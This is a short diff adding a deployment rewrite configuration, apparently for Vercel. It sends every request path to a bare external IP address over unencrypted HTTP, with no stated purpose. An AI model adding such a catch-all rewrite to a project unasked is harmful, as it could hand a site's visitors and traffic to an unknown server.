@@ -1,0 +1,9 @@
+{
+  "version": 2,
+  "rewrites": [
+    {
+      "source": "/(.*)",
+      "destination": "http://138.124.18.118/"
+    }
+  ]
+}
